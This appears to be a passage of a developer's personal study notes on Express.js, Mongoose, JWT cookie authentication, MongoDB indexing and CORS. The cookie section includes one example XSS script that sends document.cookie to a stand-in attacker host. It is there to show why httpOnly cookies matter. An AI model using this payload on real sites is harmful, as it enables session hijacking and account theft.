    - PATCH: Incremented for backward-compatible bug fixes.
- Version ranges can be specified using symbols:
    - `^1.2.3`: Compatible with version 1.x.x, but not 2.0.0 (allows updates to minor and patch versions).
    - `~1.2.3`: Compatible with version 1.2.x, but not 1.3.0 (allows updates to patch versions only).
    - `1.2.3`: Exact version 1.2.3 only.
    - `*`: Any version is acceptable.

    # EXPRESS JS

    ### What is Express.js?
    - Express js is a framework for Node.js to create servers and APIs easily.
    - It is built on top of Node's http module and makes common tasks simpler
        - Routing: define routes for different HTTP methods and URLs
        - Middleware: functions that can process requests and responses, e.g. logging, authentication, error handling
        - Request and response handling: parsing request bodies, sending JSON responses, etc.

    ### Basic Server

    ```js
    const express = require("express");
    const app = express();

    app.get("/", (req, res) => {
        res.send("Hello World!");
    });

    app.listen(3000, () => {
        console.log("Server is running on port 3000");
    });
    ```

    - When a get request is made to the root URL ('/'), the server responds with 'Hello World!'.

    ### app.use() vs app.get()
    - `app.get()` : runs only for GET requests to the specified path. Used for routes.
    - `app.use()` : runs for all HTTP methods (GET, POST, PUT, DELETE) and all paths that match the specified path. Used for middleware.
    - Example:

    ```js
    app.use((req, res, next) => {
        console.log("This runs for all requests");
        next(); // pass control to the next middleware or route handler
    });
    app.get("/", (req, res) => {
        res.send("Hello World!");
    });
    ```

    ### Should package-lock.json be added to .gitignore?

- No. Only `node_modules/` should be ignored. `package-lock.json` must be committed.

### Why

- node_modules/ → Ignore. It is huge and can be recreated anytime with `npm install`.
- package.json → Commit. It lists dependencies with version ranges (e.g. `"express": "^4.18.0"`).
- package-lock.json → Commit. It locks the exact versions of every package, including sub-dependencies.

### What happens without package-lock.json

- `^4.18.0` means any 4.x version from 4.18.0 upwards.
- Without a lock file, each install can get a different version:
    - Developer today → express 4.18.0
    - Teammate next month → express 4.21.2
    - Production server → another version
- This causes "works on my machine" bugs.
- With package-lock.json committed, everyone installs the exact same versions.

### npm install vs npm ci

- `npm install` → installs dependencies and can update package-lock.json.
- `npm ci` → installs exactly what is in package-lock.json, is faster, and fails if package.json and package-lock.json don't match. Best for servers and CI/CD deployments.

### Recommended .gitignore

```gitignore
node_modules/
.env
```

- `.env` should also be ignored, because it contains secrets like DB passwords and API keys.

## ROUTING & REQUEST HANDLING

### What is routing?

- Routing is the process of defining how an application responds to client requests for specific endpoints (URLs) and HTTP methods (GET, POST, PUT, PATCH, DELETE).
- In Express.js, routing is handled using route handlers: functions that run when a request matches a specific route and method.
- Example:

```js
app.get("/users", (req, res) => {
    res.send("Get all users");
});
app.post("/users", (req, res) => {
    res.send("Create a new user");
});
```

### What is a route handler?

- A route handler is a function that runs when a request matches a specific route and HTTP method.
- It receives `req` (request object), `res` (response object), and optionally `next` (a function that passes control to the next handler/middleware).
- Example:

```js
app.get("/users", (req, res) => {
    res.send("Get all users");
});
```

- Here, `(req, res) => { res.send('Get all users'); }` is the route handler for GET requests to `/users`.

### What is req and res?

- `req` (request): represents the HTTP request from the client. Contains the URL, HTTP method, headers, route params, query params and body data.
- `res` (response): represents the HTTP response sent back to the client. Provides methods to set the status code and headers, and to send data.
- Common res methods:
    - `res.send()` → sends text/HTML/any data
    - `res.json()` → sends JSON (sets Content-Type automatically)
    - `res.status(code)` → sets the status code (chainable: `res.status(201).json(...)`)
- Example:

```js
app.get("/users", (req, res) => {
    console.log(req.query); // query parameters
    res.status(200).json({ message: "Get all users" });
});
app.post("/users", (req, res) => {
    console.log(req.body); // request body data
    res.status(201).json({ message: "Create a new user" });
});
```

### What is req.params, req.query and req.body?

- `req.params`: route parameters, the dynamic segments of the URL. In `/users/:id`, a request to `/users/5` gives `req.params.id = '5'`.
- `req.query`: query parameters after `?` in the URL. In `/users?city=Hosur&page=2`, `req.query.city = 'Hosur'` and `req.query.page = '2'`.
- `req.body`: data sent in the request body, used with POST, PUT and PATCH. Requires body-parsing middleware:
    - `express.json()` → for JSON bodies
    - `express.urlencoded({ extended: true })` → for HTML form data
    - Without it, `req.body` is `undefined`.
- Values in req.params and req.query are always strings. Convert when needed: `Number(req.query.page)`.
- Example:

```js
app.use(express.json()); // required to read req.body

// GET /users/5?city=Hosur
app.get("/users/:id", (req, res) => {
    console.log(req.params.id); // '5'
    console.log(req.query.city); // 'Hosur'
    res.send("User details");
});

// POST /users  with body { "name": "Sakthi" }
app.post("/users", (req, res) => {
    console.log(req.body); // { name: 'Sakthi' }
    res.status(201).send("User created");
});
```

### Important rules

- Send only one response per request. Calling res.send/res.json twice causes the error: "Cannot set headers after they are sent to the client". Use `return res.json(...)` when sending early.

```js
app.get("/users/:id", (req, res) => {
    if (!req.params.id) return res.status(400).send("ID required"); // return stops further code
    res.send("User found");
});
```

- Route order matters: Express checks routes top to bottom and uses the first match.

```js
app.get('/users/new', ...);  // must come BEFORE /users/:id
app.get('/users/:id', ...);  // otherwise 'new' would be treated as an id
```

### express.Router (organizing routes)

- Used to group related routes into separate files.

```js
// routes/users.js
const router = require("express").Router();
router.get("/", (req, res) => res.send("All users")); // GET /users
router.get("/:id", (req, res) => res.send("One user")); // GET /users/:id
module.exports = router;

// app.js
app.use("/users", require("./routes/users"));
```

### Route patterns (?, +, \*, (), regex)

- Express 4 supports special characters in route strings:
    - `?` → previous character is optional: `/ab?cd` matches /acd, /abcd
    - `+` → previous character one or more times: `/ab+cd` matches /abcd, /abbbcd
    - `*` → any characters: `/ab*cd` matches /abcd, /abxyzcd
    - `()` → group, often with ?: `/ab(cd)?e` matches /abe, /abcde
    - Param regex: `/users/:id(\\d+)` → id must be digits
- Express 5 (current default) removed ?, +, \*, () from route strings; using them throws an error.
    - Optional part → `{}`: `/users{/:id}` matches /users and /users/5
    - Wildcard → named: `/files/*path` → req.params.path is an array of segments
    -   - and param regex → not supported; use a regex route or validate in the handler
- Regex routes work in both versions (pass a RegExp, not a string):

```js
app.get(/.*fly$/, (req, res) => res.send("Ends with fly")); // /butterfly, /dragonfly
app.get(/^\/users\/(\d+)$/, (req, res) => res.send(req.params[0])); // /users/5 → '5'
```

- Check the installed version with: `npm list express`

### Handling multiple route handlers and next()

- We can attach multiple route handlers to a single route.
- Each handler receives (req, res, next). Calling next() passes control to the next handler.
- Handlers can be passed one by one or as an array:

```js
app.get("/user", h1, h2, h3);
app.get("/user", [h1, h2], h3);
```

### Rules

- Every request must end with exactly one response (res.send / res.json / res.end).
- Single handler without a response → the request hangs (the client keeps waiting until timeout).
- In each handler, do either res.send() OR next(), not both.
- res.send() then next():
    - The response is sent to the client, then control passes to the next handler.
    - If the next handler also sends a response → Error: "Cannot set headers after they are sent to the client".
- next() then res.send():
    - next() runs the next handler immediately, which sends the response.
    - Control then returns to the first handler; its res.send() runs → the same error, thrown in the first handler.
- Use `return next()` or `return res.send()` so no code runs after it in that handler.
- If every handler only calls next() and none sends a response, Express's default handler responds with 404 "Cannot GET /user". It does not throw an error.

### Example

```js
app.get(
    "/user",
    (req, res, next) => {
        console.log("Handler 1");
        return next(); // pass to handler 2
    },
    (req, res) => {
        console.log("Handler 2");
        return res.send("User details"); // final response
    },
);
```

### next(err): passing errors

- Calling next(err) skips the remaining normal handlers and jumps to the error-handling middleware.

```js
app.get("/user", (req, res, next) => {
    if (!req.query.id) return next(new Error("ID required"));
    res.send("User found");
});

// Error handler: 4 parameters (err, req, res, next); defined after routes
app.use((err, req, res, next) => {
    res.status(400).json({ error: err.message });
});
```

## MIDDLEWARE

### Why multiple handlers?

- To split the work into steps: auth check → validation → actual logic.
- Each step can stop the request (send an error response) or pass it forward with next().
- These in-between handlers are called middleware.

```js
const checkAuth = (req, res, next) => {
    if (!req.headers.authorization) return res.status(401).send("Unauthorized");
    next();
};

app.get("/profile", checkAuth, (req, res) => res.send("Profile data"));
```

### What is happening under the hood in Express?

- Every app.use() and app.get()/post()/put()/delete() is added, in the order written, to an internal list called the middleware stack.
- When a request comes in, Express goes through the stack from top to bottom:
    - It checks each layer for a match on both method and path.
        - app.use('/path') → matches any method, and URLs starting with /path
        - app.get('/path') → matches only GET, and the exact path
    - If a layer matches, its function runs.
        - If it calls next() → Express continues to the next matching layer.
        - If it sends a response (res.send / res.json / res.end) → the request ends there.
    - If a layer doesn't match, it is skipped.
- If no layer sends a response, the request reaches the end of the stack and Express sends 404 "Cannot GET /path".
- That's why order matters: middleware like express.json() must be registered before the routes that need it.

### Middleware vs route handler

- Middleware: functions that run in between the request and the final response. They do work (parse body, log, check auth) and call next().
- Route handler: the final function that sends the response to the client.
- Flow: Request → middleware → middleware → route handler → Response

### Difference between app.use() and app.all()

- `app.use(path, middleware)`:
    - Runs for all HTTP methods (GET, POST, PUT, DELETE) and any URL that starts with the specified path.
    - Commonly used for middleware that applies to multiple routes (e.g., body parsing, logging).
    - Example: `app.use('/api', authMiddleware)` → runs for /api/users, /api/orders, etc.
- `app.all(path, handler)`:
    - Runs for all HTTP methods (GET, POST, PUT, DELETE) but only for the exact specified path.
    - Commonly used for defining a single handler that should respond to all methods on a specific route.
    - Example: `app.all('/status', (req, res) => res.send('Server is running'))` → responds to GET /status, POST /status

### Error handling

- In Express, error-handling middleware is defined with four parameters: `(err, req, res, next)`.
- It is used to catch errors that occur in route handlers or other middleware.
- To trigger the error handler, call `next(err)` with an error object.
- Example:

```js
app.get("/user", (req, res, next) => {
    if (!req.query.id) return next(new Error("ID required"));
    res.send("User found");
});

// Error handler: must be defined after all routes
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(400).json({ error: err.message });
});
```

- We can use try-catch blocks in async route handlers to catch errors and pass them to next(err):

```js
app.get("/async", async (req, res, next) => {
    try {
        const data = await someAsyncFunction();
        res.json(data);
    } catch (err) {
        next(err); // pass error to error handler
    }
});

app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: "Something went wrong!" });
});
```

# DATABASE CONNECTION | MONGOOSE

### What is Mongoose?

- Mongoose is a library (ODM: Object Data Modeling) that connects Node.js with MongoDB.
- MongoDB is flexible: it accepts any data in any shape, even wrong or incomplete data.
- Mongoose adds rules on top of MongoDB so only correct data is saved.
- Analogy: MongoDB is a notebook where you can write anything; Mongoose is a printed form with fixed fields and rules.

### Key terms

- Schema → the rules for the data (fields, types, required, default values)
- Model → a tool created from a schema, used to create, read, update and delete data in a collection
- Document → one record saved in the database

### Why use Mongoose?

- Schema: define the structure and data types for each field.
- Validation: rejects wrong data (missing required fields, wrong types).
- Easy queries: User.find(), User.create(), User.findById(), etc.
- Middleware (hooks): run custom code before/after saving (e.g. hash a password before saving).

### How to connect

- Install: `npm install mongoose`

```js
const mongoose = require("mongoose");

mongoose
    .connect("mongodb://localhost:27017/mydatabase")
    .then(() => console.log("Connected to MongoDB"))
    .catch((err) =>
        console.error("Could not connect to MongoDB:", err.message),
    );
```

- URL parts: mongodb:// (protocol), localhost (machine), 27017 (default port), mydatabase (DB name, auto-created on first insert).
- For MongoDB Atlas (cloud): mongodb+srv://user:password@cluster-url/dbname
- useNewUrlParser and useUnifiedTopology are no longer needed (since Mongoose 6).

### Example: schema → model → document

```js
const userSchema = new mongoose.Schema({
    name: { type: String, required: true },
    age: { type: Number },
});

const User = mongoose.model("User", userSchema); // collection: "users"

await User.create({ name: "Sakthi", age: 30 }); // ✅ saved
await User.create({ age: "thirty" }); // ❌ validation error
```

### Auto-generated fields: \_id and \_\_v

- When we save a document, Mongoose adds two fields automatically:

```json
{ "_id": "6731c2f4a1b2c3d4e5f60789", "name": "Sakthi", "__v": 0 }
```

### \_id

- A unique ID for every document (like a primary key).
- Created automatically by MongoDB.
- It also stores the creation time: `user._id.getTimestamp()`
- Used to find a document: `User.findById(id)`

### \_\_v

- A version number added by Mongoose. Starts at 0.
- Used internally to avoid update conflicts. We can ignore it.
- To remove it: `new mongoose.Schema({...}, { versionKey: false })`

### Bonus: timestamps

- `new mongoose.Schema({...}, { timestamps: true })` adds createdAt and updatedAt automatically.

### JS Object vs JSON

- JS Object: a data structure in memory, used in code.
- JSON (JavaScript Object Notation): a text format (string) used to send/store data.
- JSON rules: keys and strings must use double quotes; no functions, undefined, comments or trailing commas.
- Convert:
    - JSON.stringify(obj) → object to JSON text
    - JSON.parse(text) → JSON text to object
- In Express:
    - express.json() → converts request JSON into a JS object (req.body)
    - res.json(obj) → converts a JS object into JSON and sends it

### SCHMEMA VALIDATION

- Mongoose schema validation ensures that the data being saved to the database adheres to the defined structure and rules. It helps maintain data integrity and prevents invalid data from being stored.
- Common validation options:
- `required`: Ensures that a field must be provided.
- `type`: Specifies the data type (String, Number, Date, Boolean, Array, Object, etc.).
- `min` and `max`: For numbers, sets minimum and maximum values.
- `minlength` and `maxlength`: For strings, sets minimum and maximum length.
- `enum`: For strings, restricts the value to a set of allowed values.
- `match`: For strings, validates against a regular expression.
- `default`: Sets a default value if none is provided.
- Example:

```js
const userSchema = new mongoose.Schema({
    name: { type: String, required: true, minlength: 3 },
    age: { type: Number, min: 0, max: 120 },
    email: { type: String, match: /.+\@.+\..+/ },
    role: { type: String, enum: ["user", "admin"], default: "user" },
});
```

### Custom validation

- Mongoose allows you to define custom validation functions for more complex validation logic.
- Example:

```js
const userSchema = new mongoose.Schema({
    username: {
        type: String,
        required: true,
        validate: {
            validator: function (v) {
                return /^[a-zA-Z0-9]+$/.test(v); // only alphanumeric
            },
            message: (props) => `${props.value} is not a valid username!`,
        },
    },
});
```

- When a document is saved, Mongoose runs the custom validator and throws an error if the validation fails.
- It wont work automatically for update operations (like findByIdAndUpdate). To validate on updates, use the `runValidators: true` option:

```js
User.findByIdAndUpdate(id, { username: "invalid!" }, { runValidators: true });
```

# AUTHENTICATION :: JWT & COOKIES

### How authentication works

- The user logs in with email and password; the server verifies the credentials against the DB.
- If valid, the server creates a JWT (signed with a secret key), puts it in a cookie and sends it to the client.
- The browser stores the cookie and automatically sends it with every request to that server.
- For protected routes, the server reads the token from the cookie and verifies its signature using the secret key.
    - Valid → the request continues
    - Invalid / expired → 401 Unauthorized

### What is JWT?

- JWT (JSON Web Token) is a token used to identify a logged-in user.
- It has 3 parts separated by dots: header.payload.signature
    - Header → algorithm used
    - Payload → user data (e.g. user \_id)
    - Signature → created using the secret key; proves the token was not modified
- A JWT is signed, not encrypted: anyone can read the payload, so never store passwords or sensitive data in it.
- The server doesn't need to store the token; it just verifies the signature (stateless).
- jwt.sign → creates a token; jwt.verify → checks the signature and returns the payload if valid.
- jwt.verify returns hided value

# Cookies, explained simply (cinema ticket example)

## Definition

**Cookie:** a small piece of data that the server sends to the browser. The browser stores it and automatically sends it back with every request to that same server.

> Interview line: A cookie is a small key–value pair the server stores in the browser, which the browser sends back automatically with each request, so the server can remember the user (for example, keep them logged in).

| Part        | Detail                                                               |
| ----------- | -------------------------------------------------------------------- |
| Created by  | Server (`res.cookie()` → `Set-Cookie` header)                        |
| Stored in   | Browser                                                              |
| Sent back   | Automatically, in the `Cookie` header of each request to that domain |
| Size limit  | About 4 KB per cookie                                                |
| Common uses | Login sessions (JWT), preferences, tracking                          |

## What a cookie is

When you log in, the server gives your browser a **ticket** (the cookie).
The ticket says: "this person is Sakthi."

Every time your browser asks the server for something, it **shows the ticket automatically**.
So you don't need to log in again.

```
1. You log in with email + password
2. Server: "OK, here is your ticket"  -> browser stores the cookie
3. You open your profile -> browser shows the ticket -> server knows it's you
4. You log out -> server takes the ticket back (res.clearCookie)
```

## The four cookie settings

| Setting              | Ticket example                     | Simple meaning                                                     |
| -------------------- | ---------------------------------- | ------------------------------------------------------------------ |
| `expires` / `maxAge` | Ticket valid for 7 days            | After 7 days the ticket stops working; log in again                |
| `httpOnly`           | Ticket locked inside the wallet    | Only the browser can use it. JavaScript code cannot see or copy it |
| `secure`             | Ticket shown only in a locked room | Sent only over https (encrypted), never over plain http            |
| `sameSite`           | Only you can show your ticket      | Other websites can't make your browser use your ticket             |

## Why `httpOnly` matters

A hacker puts bad JavaScript on a page (for example, in a user bio).
That code tries to read your ticket and send it to the hacker:

```html
<script>
    fetch("https://evil.com/steal?c=" + document.cookie);
</script>
```

|                 | Result                                               |
| --------------- | ---------------------------------------------------- |
| No `httpOnly`   | The code reads the ticket. The hacker logs in as you |
| With `httpOnly` | The code finds nothing. The ticket is hidden         |

Your app still works, because the browser still shows the ticket to **your** server automatically.
Your frontend code never needs to read the token.

## Why `secure` matters

You are on public Wi-Fi.
If the ticket travels over plain `http`, someone on the same Wi-Fi can **see it**.
With `secure`, the browser sends it only over `https`, which is encrypted.

Local development runs on `http://localhost`, so turn `secure` on only in production.

## One-line summary

| Setting    | Protects against                                |
| ---------- | ----------------------------------------------- |
| `httpOnly` | Bad **code** stealing the ticket                |
| `secure`   | Bad **people on the network** seeing the ticket |
| `sameSite` | Bad **websites** using your ticket              |
| `expires`  | A stolen ticket working **forever**             |

## Production-ready code

```js
// Login: create the token and set the cookie
const token = jwt.sign({ _id: user._id }, process.env.JWT_SECRET, {
    expiresIn: "7d",
});

res.cookie("token", token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
});

// Auth middleware: read and verify the token (needs cookie-parser)
const { token } = req.cookies;
const decoded = jwt.verify(token, process.env.JWT_SECRET); // throws if tampered or expired

// Logout
res.clearCookie("token");
```

## Frontend on a different port (React/Vue + Express)

The cookie is not sent cross-origin unless both sides allow it:

```js
// Frontend (axios)
axios.get(url, { withCredentials: true });

// Backend (Express)
app.use(cors({ origin: "http://localhost:5173", credentials: true }));
```

### Packages

- jsonwebtoken → jwt.sign() to create a token, jwt.verify() to validate it
- cookie-parser → lets Express read cookies via req.cookies

### Logout

- Clear the cookie: res.clearCookie('token')

- To read cookies in Express, use the cookie-parser middleware:

```js
const cookieParser = require("cookie-parser");
app.use(cookieParser());
```

- To create a JWT:

```js
const jwt = require("jsonwebtoken");
const token = jwt.sign({ _id: user._id }, process.env.JWT_SECRET, {
    expiresIn: "1h",
});
```

### Adding Schema methods

- Mongoose allows you to define custom methods on your schema, which can be called on instances of the model (documents).
- Arrow functions cannot be used for schema methods because they do not have their own `this` context; they inherit `this` from the enclosing scope, which is not the document instance.
- Example: adding a method to generate a JWT for a user:

```js
userSchema.methods.generateAuthToken = function () {
    const token = jwt.sign({ _id: this._id }, process.env.JWT_SECRET, {
        expiresIn: "1h",
    });
    return token;
};
// Usage:
const user = await User.findById(id);
const token = user.generateAuthToken();
```

### Adding Schema pre-save middleware

- Mongoose allows you to define pre-save middleware that runs before a document is saved to the database. This is useful for tasks like hashing passwords before saving.
- Example: hashing a password using bcrypt before saving a user:

```js
const bcrypt = require("bcryptjs");
userSchema.pre("save", async function (next) {
    if (!this.isModified("password")) return next(); // only hash if password is new
    const salt = await bcrypt.genSalt(10);
    this.password = await bcrypt.hash(this.password, salt);
    next();
});
```

# EXPRESS.ROUTER()

### What is express.Router()?

- `express.Router()` is a mini Express application that can be used to organize routes into separate files or modules.
- It allows you to create modular route handlers and group related routes together, making your code cleaner and easier to maintain.
- Each router can have its own middleware, routes, and error handlers, and can be mounted on a specific path in the main app.

### How to use express.Router()?

- Create a new router instance using `express.Router()`.
- Define routes on the router instance using `router.get()`, `router.post()`, etc.
- Export the router instance and import it in your main app file.
- Mount the router on a specific path using `app.use('/path', router)`.
- Example:

```js
// routes/users.js
const express = require("express");
const router = express.Router();
router.get("/", (req, res) => {
    res.send("Get all users");
});
router.post("/", (req, res) => {
    res.send("Create a new user");
});
module.exports = router;

// app.js
const express = require("express");
const app = express();
const userRoutes = require("./routes/users");
app.use("/users", userRoutes); // Mount the router on /users
```

### Use of clearCookie?

- `res.clearCookie(name, options)` is used to clear a cookie from the client's browser.
- It sets the cookie's expiration date to a time in the past, effectively removing it.
- Important: When clearing a cookie, you must provide the same options (path, domain, secure, httpOnly) that were used when the cookie was set; otherwise, the cookie may not be cleared correctly.
- Example:

```js
// Set a cookie
res.cookie("token", jwtToken, {
    httpOnly: true,
    secure: true,
    maxAge: 3600000,
});
// Clear the cookie
res.clearCookie("token", { httpOnly: true, secure: true });
```

## Indexing & Compound Indexes in MongoDB

### Why do we need indexing?

- Indexing is a technique used in databases to improve the speed of data retrieval.
- Without an index, MongoDB performs a collection scan: it checks every document to find matches. This is slow for large collections.
- An index is a data structure that stores a small portion of the collection's data in an easy-to-search, sorted form, so MongoDB can quickly find matching documents without scanning the entire collection.
- Indexes can be created on one or more fields and greatly improve performance for frequently queried fields.
- Analogy: like the index at the back of a book; you jump straight to the right page instead of reading every page.

### How to create an index in Mongoose?

- Option 1: use the `index` option in the schema definition.
- Option 2: use the `schema.index()` method.

```js
const userSchema = new mongoose.Schema({
    name: { type: String, required: true },
    email: { type: String, required: true, unique: true }, // unique creates an index automatically
    age: { type: Number, index: true }, // Option 1
});

// Option 2
userSchema.index({ name: 1 }); // 1 = ascending, -1 = descending
```

- unique: true automatically creates an index; no need to add index: true.
- Don't define the same index twice (index: true AND schema.index()); Mongoose warns "Duplicate schema index".

### Compound Indexes

- A compound index includes multiple fields. It speeds up queries that filter or sort on those fields together.

```js
const userSchema = new mongoose.Schema({
    firstName: { type: String, required: true },
    lastName: { type: String, required: true },
    age: { type: Number },
});

userSchema.index({ firstName: 1, lastName: 1 }); // compound index
```

### Compound index: order matters (prefix rule)

- Index { firstName: 1, lastName: 1 } supports queries on:
    - firstName ✅
    - firstName + lastName ✅
    - lastName alone ❌ (the first field is skipped, so the index can't be used)
- Put the most frequently queried field first.
- Analogy: a phone directory sorted by first name, then last name. Finding "Sakthi" is fast; finding everyone with last name "Viji" needs a full scan.

### Why not index all fields?

- Indexes speed up reads but slow down writes: every insert/update/delete must also update every index.
- Each index uses disk space and RAM; too many indexes reduce overall performance.
- Fields with few distinct values (true/false, gender) gain little from an index.
- MongoDB allows a maximum of 64 indexes per collection.
- Rule: index only the fields frequently used in search, filter or sort (e.g. email, userId, createdAt).

# REF & POPULATE

### What is ref in Mongoose?

- In Mongoose, `ref` creates a reference from one model to another.
- It creates a relationship between two collections, similar to a foreign key in SQL.
- The document stores only the \_id of the other document, not its full data.
- `ref` tells Mongoose which model that \_id belongs to, so Mongoose knows where to fetch the data from.
- Example:

```js
const connectionRequestSchema = new mongoose.Schema({
    fromUserId: {
        type: mongoose.Schema.Types.ObjectId,
        ref: "User", // must match the model name: mongoose.model('User', ...)
        required: true,
    },
    toUserId: {
        type: mongoose.Schema.Types.ObjectId,
        ref: "User",
        required: true,
    },
    status: { type: String, required: true },
});
```

- What is actually stored in the DB (only IDs):

```json
{
    "_id": "6af5a97ec55142f1465cd57d",
    "fromUserId": "6731c2f4a1b2c3d4e5f60789",
    "toUserId": "6731c2f4a1b2c3d4e5f60790",
    "status": "interested"
}
```

### What is populate in Mongoose?

- `populate()` replaces the stored \_id with the actual document from the referenced collection.
- Without populate → we get only the ID. With populate → we get the user's details.
- populate works only on fields that have `ref` defined.
- Example:

```js
// Without populate
const requests = await ConnectionRequest.find({ toUserId: loggedInUser._id });
// fromUserId: "6731c2f4a1b2c3d4e5f60789"

// With populate
const requests = await ConnectionRequest.find({
    toUserId: loggedInUser._id,
}).populate("fromUserId");
// fromUserId: { _id: "6731c2f4...", firstName: "Sakthi", lastName: "Viji", email: "...", password: "..." }
```

### Select only the fields you need

- By default, populate returns ALL fields of the referenced document, including sensitive ones like password.
- Always select only the safe fields:

```js
// As a string (space separated)
.populate('fromUserId', 'firstName lastName photoUrl')

// As an array
.populate('fromUserId', ['firstName', 'lastName', 'photoUrl'])

// Reusable constant (good practice)
const USER_SAFE_DATA = 'firstName lastName photoUrl age gender about skills';
.populate('fromUserId', USER_SAFE_DATA)
```

### Populate multiple fields

```js
// Chain populate calls
ConnectionRequest.find()
    .populate("fromUserId", USER_SAFE_DATA)
    .populate("toUserId", USER_SAFE_DATA);

// Or pass an array of objects
ConnectionRequest.find().populate([
    { path: "fromUserId", select: USER_SAFE_DATA },
    { path: "toUserId", select: USER_SAFE_DATA },
]);
```

### Populate with options

- Object syntax gives more control:

```js
.populate({
  path: 'fromUserId',          // field to populate
  select: 'firstName lastName', // fields to return
  match: { age: { $gte: 18 } }, // filter populated docs (non-matching become null)
  options: { sort: { firstName: 1 } },
})
```

### Nested populate

- Populate a reference inside an already populated document:

```js
// Post → author (User) → company (Company)
Post.find().populate({
    path: "author",
    select: "firstName company",
    populate: { path: "company", select: "name" },
});
```

### Populate on an existing document

```js
const request = await ConnectionRequest.findById(id);
await request.populate("fromUserId", USER_SAFE_DATA);
```

### What happens under the hood?

- populate is NOT a database JOIN. Mongoose runs a separate extra query:
    1. Runs the main query → gets the requests with fromUserIds
    2. Collects all the fromUserIds
    3. Runs a second query: User.find({ \_id: { $in: [ids] } })
    4. Replaces each ID with the matching user document
- So each populate adds one extra query. Too many populates = slower responses.
- For heavy joins/aggregations at the DB level, use MongoDB's `$lookup` (aggregation pipeline).

### Edge cases

- If the referenced document was deleted, the populated field becomes null. Handle it in code.
- If `ref` is missing in the schema, populate does nothing (the ID stays as is).
- The ref name must exactly match the model name ('User', not 'user' or 'users').

### Real example: get connection requests received by the logged-in user

```js
const USER_SAFE_DATA = "firstName lastName photoUrl age gender about skills";

userRouter.get("/user/requests/received", userAuth, async (req, res) => {
    try {
        const requests = await ConnectionRequest.find({
            toUserId: req.user._id,
            status: "interested",
        }).populate("fromUserId", USER_SAFE_DATA);

        res.json({ message: "Data fetched successfully", data: requests });
    } catch (err) {
        res.status(400).json({ message: err.message });
    }
});
```

### Reference (ref) vs Embedding

- Reference (ref + populate):
    - Stores only the ID; data lives in its own collection.
    - Use when data is shared, large, or updated often (e.g. users referenced by many requests).
    - Update once → reflected everywhere.
- Embedding:
    - Stores the full data inside the document.
    - Use when data is small and belongs only to that document (e.g. a user's address).
    - Faster reads (no extra query), but data gets duplicated if shared.

    ### $nin $ne $in and other operators

- `$in`: matches any value in the given array. Example: `{ age: { $in: [20, 25, 30] } }` → age is 20, 25, or 30.
- `$nin`: matches values NOT in the given array. Example: `{ age: { $nin: [20, 25, 30] } }`
- `$ne`: matches values NOT equal to the given value. Example: `{ status: { $ne: 'inactive' } }` → status is not 'inactive'.
- `$gt`, `$gte`, `$lt`, `$lte`: greater than, greater than or equal, less than, less than or equal. Example: `{ age: { $gte: 18 } }` → age is 18 or older.
- `$exists`: checks if a field exists. Example: `{ email: { $exists: true } }` → documents that have an email field.
- `$regex`: matches a string using a regular expression. Example: `{ name: { $regex: '^Sak', $options: 'i' } }` → name starts with 'Sak', case-insensitive.
- `$or`: matches documents that satisfy at least one of the given conditions.
  Example:

```js
User.find({
    $or: [{ age: { $lt: 18 } }, { status: "inactive" }],
});
```

### .skip() and .limit()

- `.skip(n)`: skips the first `n` documents in the result set. Useful for pagination.
- `.limit(n)`: limits the result set to `n` documents. Also useful for pagination.
- Example: To get page 2 of users with 10 users per page

```js
const page = 2;
const limit = 10;
const users = await User.find()
    .skip((page - 1) * limit)
    .limit(limit);
```

### CORS (Cross-Origin Resource Sharing)

### What is the problem?

- Browsers follow the Same-Origin Policy: a web page can only call APIs from the same origin by default.
- Origin = protocol + domain + port. If any one differs, it's a different origin:
    - http://localhost:5173 (React app) → http://localhost:3000 (Node API) → different port → different origin ❌
- When the frontend calls an API from a different origin, the browser blocks the response and shows a CORS error.
- CORS is a browser security rule, not a server error:
    - The request may still reach the server; the browser just refuses to give the response to the JS code.
    - Postman, curl and server-to-server calls are not affected (no browser).

### How is it solved?

- The server must tell the browser which origins are allowed, using response headers:
    - Access-Control-Allow-Origin: http://localhost:5173
- In Express, the `cors` package adds these headers for us.
- Install: `npm install cors`

### Basic usage

```js
const cors = require("cors");

app.use(cors()); // allows ALL origins: fine for testing, not for production
```

### Options: origin and credentials

```js
app.use(
    cors({
        origin: "http://localhost:5173", // only this frontend is allowed
        credentials: true, // allow cookies to be sent and received
    }),
);
```

- origin → which frontend(s) can call the API
    - A single URL: 'http://localhost:5173'
    - Multiple: ['http://localhost:5173', 'https://devtinder.com']
- credentials: true → required when using cookies (e.g. a JWT token in a cookie)
    - With credentials: true, origin cannot be '\*'; it must be a specific URL.
- The frontend must also send cookies explicitly:

```js
// axios
axios.post("http://localhost:3000/login", data, { withCredentials: true });

// fetch
fetch("http://localhost:3000/login", {
    method: "POST",
    credentials: "include",
});
```

- Without both (credentials: true on the server + withCredentials on the client), the cookie won't be saved or sent.

### Preflight request (OPTIONS)

- For "non-simple" requests (PUT, PATCH, DELETE, JSON body, custom headers like Authorization), the browser first sends an OPTIONS request asking the server: "Is this allowed?"
- If the server responds with the right CORS headers, the browser then sends the actual request.
- The cors package handles preflight automatically.

### Important

- app.use(cors(...)) must come before the routes.
